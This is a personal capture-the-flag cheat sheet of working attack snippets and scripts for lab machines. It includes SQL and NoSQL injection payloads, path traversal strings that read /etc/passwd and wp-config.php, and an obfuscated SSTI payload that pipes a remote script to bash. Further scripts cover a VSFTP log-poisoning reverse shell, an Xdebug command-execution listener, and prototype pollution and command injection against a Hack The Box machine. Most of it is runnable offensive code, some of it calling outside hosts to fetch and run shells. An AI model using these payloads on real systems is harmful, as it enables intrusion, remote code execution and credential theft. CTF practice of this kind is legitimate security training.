# Some CTF stuff
Theses are some tid-bits so I can remember them later... it is mess atm, but will clean up later... maybe... :)

TODO:
- add more usable stuff
- need better formatting

## Useful resources

[resh online - change IP :)](https://resh.now.sh/172.16.1.100:9901)

[PayloadsAllTheThings - github](https://github.com/swisskyrepo/PayloadsAllTheThings)

[GTFOBins](https://gtfobins.github.io/)

[LOLBAS](https://lolbas-project.github.io/)

[xct - github](https://github.com/xct)

[Ropstar - simple linux bof challanges helper by xct](https://github.com/xct/ropstar)

[Ippsec Rocks](https://ippsec.rocks/?#)

## Spawn shell and fix tty

```bash
# victim
python3 -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z

# attacker
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# victim
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <lines> columns <cols>
```

## DNS enum

Maybe not directly useful in CTF's, but maybe in some cases it could be useful to get IPv6

```bash
dig ANY @dns-server.evil.corp evil.corp
```

## SQL inject

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval
https://book.hacktricks.xyz/pentesting/pentesting-web/flask

```
sqlmap evil.corp --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='<secret_key>')" --cookie="session=*" --dump

multiple question - answer = N N N
```

## NoSQL inject

Request:
```
POST /api/login

username=admin&password=pass
```

Inject:
```
username[$ne]=evil&password[$ne]=corp
```

Using `regex` to get password (useful script bellow):
```
username=admin&password[$regex]=A*
```

## Python Flask

SSTI bypass WAF if blacklisted: . _ ' {{ }} for if set block extends
allowed: {% %} ( ) " [ ] while with

```python
{% with x = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo YmFzaCAtYyAiY3VybCAxMC4xMC4xNC4xMTU6ODE4MS9yZXNoIHwgYmFzaCIK | base64 -d | bash")["read"]() %} x {% endwith %}
```

## Some path traversal bypass

WAF code for possible path traversal `evil.corp/?lang=es.php`:
```php
$language = str_replace('../', '', $_GET['language']);
```

Inject code:
```
http://evil.corp/?lang=....//....//....//....//....//....//....//....//etc/passwd
```

## Tomcat path traversal

https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/

```
http://evil.corp/manager/status/..;/html
```

sometimes above is useful if NGINX / Apache web server have access restriction for /manager/html

## NGINX path traversal

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

```
http://evil.corp/admin../server-status
```

## WordPress Spritz path traversal

```
curl "http://evil.corp/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php"

curl "http://evil.corp/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://10.10.14.47/nfo.php"
```

## WFUZZ usage

### LFI case
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt

```
wfuzz -c -u http://evil.corp/admin/index.php?page=FUZZ -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 123

wfuzz -c -w file_inclusion_linux.txt "http://evil.corp/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=FUZZ" --hw 0
```

TODO: make some better LFI fuzzing file by using LFI-Jhaddix as example, but clean up and add some stuff that have been in other CTFs (maybe - if not lazy?!)

### fuzzing range

```
wfuzz -c --hc 404 -z range,0-9 -z range,0-9 http://evil.corp/documents/2021-0FUZZ-0FUZ2Z.txt
```

## SMB / RPC

### rpclient

```
rpcclient -U "" -N <host>
```

Useful commands:
- enumdomusers
- queryuser $rid$
- getdowmpwinfo
- getusrdompwinfo $rid$
- srvinfo
- enumdomains
- querydominfo
- lsaenumsid
- lookupsid $sid$
- netshareenum
- netshareenumall

## DOCKER

https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_module
https://www.youtube.com/watch?v=LUhduIyR1YQ

## Random and useful commands
Some random useful commands that seen the light of day in certain cases

### Parse usernames from PDF

```
exiftool *.pdf | awk '{print $3}'
```

## Random and useful scripts
These are not proffesional scripts, so they are really ugly, but they do the job ;)

### Send mail from bash via telnet

```bash
#!/bin/bash

{
	sleep 1
	echo "helo evil.corp"
	sleep 1
	echo "mail from: user@devil.corp"
	sleep 1
	echo "rcpt to: root@evil.corp"
	sleep 1
	echo "data"
	sleep 0.5
	echo "hey from evil.corp"
	sleep 0.5
	echo "."
	sleep 1
	echo "quit"
} | telnet 127.0.0.1 25


if [ -f /tmp/123 ]; then
	echo "[+] file exists ..."
	cat /tmp/123
else
	echo "[!] file not found ..."
fi
```

### VSFTP log poisoning with PHP shell

```python
import time
import ftplib
import requests

payload = '<?php passthru("curl 172.16.1.100/resh | sh"); ?>'
url = 'http://<host>/admin/index.php?page=/var/log/vsftpd.log'

aq = input("[!] HTTP server up with resh? nc also up? ")

print("[*] send payload to server with fake ftp login ...")

try:
  ftp = ftplib.FTP('evil.corp', payload, 'whatever:)')
  ftp.close()
except ftplib.all_errors as e:
  print(e)

print("[*] sleep 5 sec ...")
time.sleep(5)

print("[*] request url and hopefully execute reverse shell ...")

r = requests.get(url, timeout=10)
print(r.status_code)
```

### XDEBUG - PHP xdebug sometimes is enabled and can be abused
This script is not perfect and have some problems, but mostly it works.

With this best PHP command is `shell_exec()`

```python
import sys
import base64
import socket
import xml.etree.ElementTree as ET

ip_port = ('0.0.0.0',9000)

print("[*] Waiting for data callback ...")

sock = socket.socket()
sock.bind(ip_port)
sock.listen(10)
conn, addr = sock.accept()

while True:
  try:
    # get data from server
    rcvd_data_b = conn.recv(16384)
    rcvd_data = rcvd_data_b.decode('ascii')
    xml_data = rcvd_data[(rcvd_data.index('\x00')+1):(len(rcvd_data)-1)]
    xml_root = ET.fromstring(xml_data)
    resp = ""
    resp_decode = False
    if 'init' in xml_root.tag:
      # prepare initial response
      resp = f"{xml_root[0].text} {xml_root[0].attrib}"
    elif 'response' in xml_root.tag:
      # prepare response response
      resp = f"{xml_root[0].text} {xml_root[0].attrib}"
      resp_decode_raw = xml_root[0].text
      resp_decode_b_b64 = resp_decode_raw.encode('ascii')
      resp_decode_b = base64.b64decode(resp_decode_b_b64)
      resp_decode = resp_decode_b.decode('ascii')
    else:
      # prepare default response
      resp = f"UNPARSED!! {xml_data}"
    
    print(f"[<] RESP: {resp}")
    if resp_decode != False:
      print(f"[+] RESPONSE OUTPUT: {resp_decode}")

    print(" ")
    # print input and for command eval
    data = input('[*] PHP commands only >> ')
    data_b = data.encode('ascii')
    data_b_b64 = base64.b64encode(data_b)
    data_b64 = data_b_b64.decode('ascii')
    command = f"eval -i 1 -- {data_b64}\x00"
    print(f"[>] SENT: {command}")
    command_b = command.encode('ascii')
    conn.sendall(command_b)
  except KeyboardInterrupt:
    sys.exit()
  except Exception as e:
    print("[-] ERROR: ", e)
    sys.exit()
```

### Simpe LDAP requests

```python
import ldap3

target = 'evil.corp'

server = ldap3.Server(target, get_info = ldap3.ALL, port=636, use_ssl = True)
connection = ldap3.Connection(server)
connection.bind()

print("==============> SERVER.INFO")
print(server.info)

print(" ")

connection.search(search_base='DC=EVIL,DC=CORP', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
print("==============> CONNECTION.ENTRIES")
print(connection.entries)
```

### Download multiple files from WWW

```python
import time
import requests

# http://evil.corp/documents/2020-12-15.pdf
baseUrl = 'http://evil.corp/documents/'

for i in range(1, 13):
  for x in range(1, 32):
    #print("2020-{:02d}-{:02d}".format(i,x))
    time.sleep(1) # can comment out if no worries about spamming ;)
    file_name = "2020-{:02d}-{:02d}.pdf".format(i,x)

    r = requests.get(baseUrl + file_name)
    if r.status_code == 200:
      print(f"[+] Found file: {file_name} ...")
      print("[+] Downloading and writing file ...")

      with open(file_name, 'wb') as f:
        f.write(r.content)
```

### Parse PDF file and output TEXT
```python
import os
import PyPDF2

directory = './'
for filename in os.listdir(directory):
  if filename.endswith(".pdf"):
    print(f"===> {filename}")

    with open(filename, 'rb') as f:
      pdfreader = PyPDF2.PdfFileReader(f)
      pageObj = pdfreader.getPage(0)
      text = pageObj.extractText()

      print(text)

    print("######################################")
```

### Prototype pollution in retired machine HTB UNOBTAINIUM
Script gives felamos user canDelete and canUpload rights (for task just canUpload needed)

Snippet from original code:
```javascript
const users = [                                                                               
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
];

...

app.put('/', (req, res) => {   
  const user = findUser(req.body.auth || {});                                                 
                                               
  if (!user) {                                 
    res.status(403).send({ok: false, error: 'Access denied'});                                
    return;
  }

  const message = {
    icon: '__',
  };
/*    /---------- injection point      */
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});
```

Script to inject canDelete and canUpload:
```python
import requests

url = 'http://unobtainium.htb:31337/'

headers = {
  "Content-Type": "application/json"
}

# https://github.com/kimmobrunfeldt/lodash-merge-pollution-example
json = {"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"constructor": {"prototype": {"canDelete": "true", "canUpload": "true"}}}}

r = requests.put(url, headers=headers, json=json)

print(r.headers.get('content-type'))
print(r.status_code)

if 'application/json' in r.headers.get('Content-Type'):
  print(r.json())
else:
  print(r.text)
```

### Google Cloud-storage commands injection in retired machine HTB UNOBTAINIUM
Script allows upload file / inject shell commands

Snippet from original code:
```javascript
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  /*                  /------------- injection point   */
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
```

Script to inject command:
```python
import requests

url = 'http://unobtainium.htb:31337/upload'

headers = {
  "Content-Type": "application/json"
}

payload = '& echo 123 | tee 123.txt'
json = {"auth": {"name": "felamos", "password": "Winter2021"}, "filename": payload}

r = requests.post(url, headers=headers, json=json)

print(r.headers.get('content-type'))
print(r.status_code)

if 'application/json' in r.headers.get('Content-Type'):
  print(r.json())
else:
  print(r.text)
```

### Script for getting NoSQL login password
This script is just a copy from writeup by [thewhiteh4t](https://github.com/thewhiteh4t?tab=repositories)

```python
  #!/usr/bin/env python3
  #################################
  ## Author    : thewhiteh4t ######
  ## Challenge : Wild Goose Hunt ##
  #################################
  import json
  import requests
  ip = '138.68.187.25'
  port = 31370
  url = f'http://{ip}:{port}/api/login'
  flag = 'CHTB{'
  charset = '_01234abcdefghijklmnopqrstuvwxyz'
  loop_iter = 1
  while flag.endswith('}') == False:
    for char in charset:
      if loop_iter == 1:
        payload = flag + char + '.*'
      else:
        payload = flag + '}'
      data = {
        'username': 'admin',
        'password[$regex]': payload
      }
      try:
        rqst = requests.post(url, data=data)
      except Exception as e:
        print(f'[-] Exception : {e}')
        exit()
      if rqst.status_code == 200:
        resp = rqst.text
        json_resp = json.loads(resp)
        status = json_resp['logged']
        if status == 1:
          if payload.endswith('}') == False:
            flag = payload.replace('.*', '')
          else:
            flag = payload
            print(f'FLAG : {flag}')
            exit()
          print(f'FLAG : {flag}')
          loop_iter = 0
          break
      else:
          print(f'[-] Error : {rqst.status_code}')
    loop_iter += 1
```
